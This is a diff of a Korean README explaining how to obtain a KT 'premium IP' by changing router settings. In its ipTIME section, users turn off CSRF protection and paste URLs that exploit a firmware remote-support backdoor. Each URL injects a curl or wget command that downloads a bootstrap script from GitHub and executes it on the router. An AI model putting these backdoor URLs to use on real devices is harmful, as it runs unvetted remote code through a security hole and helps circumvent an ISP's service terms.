@@ -110,13 +110,14 @@ KT GiGA WiFi와 연결된 기기에서 http://172.30.1.254:8899 , 구성되지 �
 
 __변경 사항은 다음에 유선 또는 무선으로 연결될 때 적용되므로 KT GiGA WiFi를 재시동하거나 각 기기의 네트워크 연결을 끊었다가 다시 연결해야 할 수 있습니다.__
 ## iptime
-백도어 출처 - https://github.com/tylzars/iptime-debug - 펌웨어 버전 15.10.0, ipTIME A2004S에서 동작 확인됨
-<br>알려진 문제 - BE3600M/BE5100M 등 일부 기기를 지원하지 않는 문제가 확인되어 미러 링크에서 먼저 해당 문제를 수정하였으며, 곧 원본 링크에도 제공될 예정입니다
-위 출처와 같이 iptime 공유기의 '원격 지원'기능에 잠재된 백도어에 접근할 방법이 있는 경우에만 유효합니다
+백도어 출처 - https://github.com/tylzars/iptime-debug - 펌웨어 버전 15.10.0, ipTIME A2004S에서 동작 확인됨<br>
+> [!NOTE]
+> BE3600M/BE5100M 등 일부 기기를 지원하지 않는 문제가 확인되어 미러 링크에서 먼저 해당 문제를 수정하였으며, 곧 원본 링크에도 제공될 예정입니다.<br>
+> 위 출처와 같이 iptime 공유기의 '원격 지원'기능에 잠재된 백도어에 접근할 방법이 있는 경우에만 유효합니다
 
 <a href="https://github.com/veilRedeemer/udhcp/releases">미리 빌드된 udhcpc 출처</a>
 
-1. 적용하려는 기기는 관리자 계정/비밀번호가 설정되어 있어야 하며, 다음으로 '악성 스크립트 접근 방지(CSRF)'기능이 꺼져 있으며, 마지막으로 '원격 지원'기능이 켜져 있어야 합니다:
+1. 적용하려는 기기는 관리자 계정/비밀번호가 설정되어 있어야 하며, 다음으로 '악성 스크립트 접근 방지(CSRF)'기능이 꺼져 있으며, 마지막으로 '원격 지원'기능을 켜 주세요:
 <img width="285" alt="iptime1" src="https://github.com/user-attachments/assets/ef4882cc-03a4-4478-acd1-a0418048dca0" />
 
 2. 아래 주소 중 상황에 맞는 적절한 **하나**의 '⧉'를 선택하여 복사 후 로그인한 관리자 페이지의 주소 칸에 붙여넣어 마칩니다.<br>
@@ -126,6 +127,9 @@ http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dap
 ```
 <img width="498" alt="notls" src="https://github.com/user-attachments/assets/6ee27eda-0b7f-4213-a868-7a118907b1d3" />
 
+> [!NOTE]
+> Network Unreachable 오류가 출력되는 경우 원본 또는 미러 서버로부터 필요한 파일을 다운로드하지 못한 것이며, 미러 서버가 드물게 접속자의 IP 대역을 허용하지 않았을 수 있으므로 KT 인터넷을 사용중인 것이 맞다면 제보해주시기 바랍니다.
+
 또는 둘 중 사용자의 환경에서 사용 가능한 원본 링크 사용:
 ```
 http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=curl%20-Lo%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
@@ -133,10 +137,12 @@ http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dap
 ```
 http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
 ```
-3. 아래와 같이 표시되면 성공. 다운로드한 데이터와 **취득한 프리미엄 IP를 포함**하여 2번 이후의 변경 사항은 특정 공유기 설정을 변경하거나 재시동되거나 전원이 끊어지면 지워집니다:
+3. 아래와 같이 표시되면 성공. 다운로드한 데이터와 **취득한 프리미엄 IP를 포함**하여 2번 이후의 변경 사항은 특정 공유기 설정을 변경하거나 재부팅되거나 전원이 끊어지면 지워집니다:
 <img width="333" alt="iptime2" src="https://github.com/user-attachments/assets/fa6ee8d4-9990-4f80-8d70-8ad551737b36" />
 
-VPN 클라이언트(WireGuard 제외)를 구성한 경우 '여러 개의 WAN 인터페이스로 인해 실패'메시지가 표시되면 해당 오류를 발생시키는 프로파일을 제거한 후 다시 시도해봅시다
+> [!TIP]
+> 이미 링크를 적용한 상태에서 성공 여부와 상관없이 다시 시도하면 중복 적용으로 인한 문제 발생을 미연에 방지하기 위해 공유기가 재부팅됩니다.<br>
+> VPN 클라이언트(WireGuard 제외)를 구성한 경우 '여러 개의 WAN 인터페이스로 인해 실패'메시지가 표시되면 해당 오류를 발생시키는 프로파일을 제거한 후 다시 시도해봅시다
 
 ## Ubiquiti (예시로서 UniFi Express)
 대시보드에서 톱니바퀴 아이콘 - Internet - KT GiGA 인터넷 연결을 제공하는 WAN 포트 - DHCP Client Options에 Option은 60,  값은 'KT_PR_HH_A_A'로 설정 후 추가 & 적용합니다.
